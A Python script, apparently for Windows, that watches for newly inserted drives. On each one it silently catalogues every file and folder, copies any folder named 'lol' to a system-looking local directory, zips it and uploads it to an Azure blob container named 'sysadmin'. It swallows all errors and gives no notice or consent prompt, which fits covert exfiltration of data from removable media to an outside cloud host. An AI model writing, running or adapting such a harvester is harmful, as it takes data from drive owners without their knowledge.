import os
import time
import win32file
import shutil

# setting up the azure system
from azure.storage.blob import BlobServiceClient, generate_blob_sas, BlobSasPermissions
blobClient = BlobServiceClient.from_connection_string('CONNECTION_STRING_AZURE')
container_name = "sysadmin"
from datetime import datetime, timedelta

# sas token generation
def SASToken(blob_name):
    sas_token = generate_blob_sas(
        account_name=blobClient.account_name,
        container_name=container_name,
        blob_name=blob_name,
        account_key="AZURE_ACCOUNT_KEY",
        permission=BlobSasPermissions(read=True),
        expiry=datetime.utcnow() + timedelta(hours=12)
    )
    return sas_token

localStorage = "C:\\System\\Logs"
logFile = os.path.join(localStorage, "drive_log.txt")

# Ensure the storage directory exists
os.makedirs(localStorage, exist_ok=True)

def uploadFolder(file_path):
    try:
        file_name = os.path.basename(file_path)
        blob_client = blobClient.get_blob_client(container=container_name, blob=f"{time.time()}-{file_name}")
        with open(file_path, "rb") as file:
            blob_client.upload_blob(file, overwrite=True)
    except Exception as e:
        pass

def generate_log(drive):
    logEntries = []
    for root, dirs, files in os.walk(drive):
        for d in dirs:
            logEntries.append((d, "folder", 0))
        for f in files:
            file_path = os.path.join(root, f)
            try:
                file_size = os.path.getsize(file_path)
                logEntries.append((f, "file", file_size))
            except Exception as e:
                pass
    logEntries.sort(key=lambda x: (x[1] != "folder", -x[2] if x[1] == "file" else 0))
    formatted_entries = [entry[0] for entry in logEntries]
    logData = f"{drive}: {', '.join(formatted_entries)}"

    with open(logFile, "w") as log:
        log.write(logData + "\n")

def copyFolder(source, destination):
    destPath = os.path.join(destination, os.path.basename(source))
    os.makedirs(destPath, exist_ok=True)
    for root, _, files in os.walk(source):
        for file in files:
            fullPath = os.path.join(root, file)
            relPath = os.path.relpath(fullPath, source)
            destFile = os.path.join(destPath, relPath)
            os.makedirs(os.path.dirname(destFile), exist_ok=True)
            shutil.copy2(fullPath, destFile)

def processFile(drive):
    try:
        lolPath = os.path.join(drive, "lol")
        generate_log(drive)
        if os.path.exists(lolPath):
            copyFolder(lolPath, localStorage)
            zipPath = shutil.make_archive(os.path.join(localStorage, "lol"), "zip", lolPath)
            uploadFolder(zipPath)
            os.remove(zipPath)
        else:
            pass
    except Exception as e:
        pass
    
def monitorDrive():
    drives = {f"{chr(65 + i)}:\\" for i in range(26) if win32file.GetLogicalDrives() & (1 << i)}
    while True:
        currentDrives = {f"{chr(65 + i)}:\\" for i in range(26) if win32file.GetLogicalDrives() & (1 << i)}
        newDrives = currentDrives - drives
        if newDrives:
            for drive in newDrives:
                processFile(drive)
        drives = currentDrives
        time.sleep(0.5) 

if __name__ == "__main__":
    monitorDrive()
